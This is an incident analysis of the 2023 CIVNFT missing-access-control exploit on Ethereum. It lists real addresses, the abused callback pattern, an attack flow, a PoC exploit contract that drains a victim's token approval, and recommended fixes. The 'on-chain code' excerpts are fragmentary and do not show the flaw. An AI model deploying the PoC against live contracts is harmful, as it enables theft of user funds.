# CIVNFT Access Control Vulnerability Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | CIV NFT |
| Date | 2023-07-01 |
| Chain | Ethereum Mainnet |
| Loss | ~$180,000 USD |
| Attack Type | Missing Access Control |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0xbf9df575670c739d9bf1424d4913e7244ed3ff66` |
| Attack Contract | `0x1ae3929e1975043e5443868be91cac12d8cc25ec` |
| Vulnerable Contract | `0xF169BD68ED72B2fdC3C9234833197171AA000580` (CIVNFT) |
| Attack TX | `0x93a033917fcdbd5fe8ae24e9fe22f002949cba2f621a1c43a54f6519479caceb` |
| Fork Block | 17,649,875 |

## 2. Vulnerability Code Analysis

The CIVNFT contract's function selector `0x7ca06d68` was externally callable without any access control. This function internally triggered `uniswapV3MintCallback()`, transferring CIV tokens from the victim address (`0x512e9701D314b365921BcB3b8265658A152C9fFD`) to the attacker.

```solidity
// ❌ Vulnerable pattern: internal function with no access control (selector 0x7ca06d68)
// This function is callable by anyone and internally triggers uniswapV3MintCallback
function call0x7ca06d68(address victim, address recipient) external {
    // ❌ No caller validation — arbitrary attacker can specify the victim address
    // ❌ Internally triggers token transfer via uniswapV3MintCallback
    bytes memory callData = abi.encodeWithSelector(
        bytes4(0xd3487997),  // uniswapV3MintCallback selector
        IERC20(CIV).allowance(victim, address(this)),
        0,
        abi.encode(victim)
    );
    (bool success,) = address(this).call(callData);
    require(success);
}

// ❌ Uniswap V3 callback abuse (selector 0xd3487997)
function uniswapV3MintCallback(
    uint256 amount0Owed,
    uint256 amount1Owed,
    bytes calldata data
) external {
    // ❌ No msg.sender validation → allows arbitrary callers (does not require a real Uniswap V3 Pool)
    address victim = abi.decode(data, (address));
    // ❌ Exploits victim's CIV token approval to transfer tokens to the attacker
    IERC20(CIV).transferFrom(victim, msg.sender, amount0Owed);
}
```

**Vulnerability**: Core functions were externally callable without `msg.sender` validation, allowing exploitation of the victim's token approval to perform unauthorized transfers.

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Ownable.sol
 * @dev Contract module which provides a basic access control mechanism, where  // ❌
```

```solidity
// File: Address.sol
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }
```

## 3. Attack Flow

```
Attacker [0xbf9df575670c739d9bf1424d4913e7244ed3ff66]
  │
  ├─1─▶ Call CIVNFT.call0x7ca06d68()
  │      [CIVNFT: 0xF169BD68ED72B2fdC3C9234833197171AA000580]
  │      → Internally triggers uniswapV3MintCallback
  │
  ├─2─▶ Call callUniswapV3MintCallback() (selector 0xd3487997)
  │      → Exploits victim's [0x512e9701D314b365921BcB3b8265658A152C9fFD] CIV approval
  │
  ├─3─▶ Transfer CIV token [0x37fE0f067FA808fFBDd12891C0858532CFE7361d]
  │      victim → attacker
  │
  └─4─▶ Convert to WETH [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2] to realize profit
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract CIVNFTExploit {
    address CIVNFT = 0xF169BD68ED72B2fdC3C9234833197171AA000580;
    address victim = 0x512e9701D314b365921BcB3b8265658A152C9fFD;
    IERC20 CIV = IERC20(0x37fE0f067FA808fFBDd12891C0858532CFE7361d);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testExploit() external {
        // Call vulnerable function (no access control)
        (bool success,) = CIVNFT.call(
            abi.encodeWithSelector(bytes4(0x7ca06d68), victim, address(this))
        );
        require(success, "call0x7ca06d68 failed");

        // Exploit Uniswap V3 MintCallback
        (bool success2,) = CIVNFT.call(
            abi.encodeWithSelector(
                bytes4(0xd3487997),  // uniswapV3MintCallback
                CIV.allowance(victim, CIVNFT),
                0,
                abi.encode(victim)
            )
        );
        require(success2, "callback failed");
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | Missing Access Control, DEX Callback Abuse |
| Impact Scope | Victim's entire CIV token balance |
| Explorer | [Etherscan](https://etherscan.io/address/0xF169BD68ED72B2fdC3C9234833197171AA000580) |

## 6. Security Recommendations

```solidity
// Fix 1: Validate pool address in Uniswap V3 callback
function uniswapV3MintCallback(
    uint256 amount0Owed,
    uint256 amount1Owed,
    bytes calldata data
) external {
    // Must only be callable from a legitimate Uniswap V3 Pool
    (address token0, address token1, uint24 fee) = abi.decode(data, (address, address, uint24));
    address pool = IUniswapV3Factory(factory).getPool(token0, token1, fee);
    require(msg.sender == pool, "Callback: not a valid pool");

    if (amount0Owed > 0) IERC20(token0).transfer(msg.sender, amount0Owed);
    if (amount1Owed > 0) IERC20(token1).transfer(msg.sender, amount1Owed);
}

// Fix 2: Apply onlyOwner or role-based access control to sensitive functions
modifier onlyAuthorized() {
    require(hasRole(OPERATOR_ROLE, msg.sender), "Not authorized");
    _;
}

function sensitiveOperation(address target, bytes calldata data) external onlyAuthorized {
    (bool success,) = target.call(data);
    require(success);
}

// Fix 3: Prohibit arbitrary external calls
// Restrict calls to an allowlist of approved targets only
mapping(address => bool) public allowedTargets;
```

## 7. Lessons Learned

1. **DEX Callback Validation is Mandatory**: DEX callbacks such as `uniswapV3MintCallback` and `uniswapV3SwapCallback` must always verify that `msg.sender` is a legitimate DEX pool.
2. **Function Selector Exposure Risk**: All internal functions reachable via low-level `call()` require access control. Function selector collisions must also be audited.
3. **Minimize Token Approval Scope**: Users should only approve the exact amount required; unlimited approvals (`type(uint256).max`) risk total fund loss if a contract vulnerability is exploited.
4. **Security Audits for NFT Projects**: DeFi projects integrated with NFTs, such as CIV, require dedicated security audits of their token transfer mechanisms.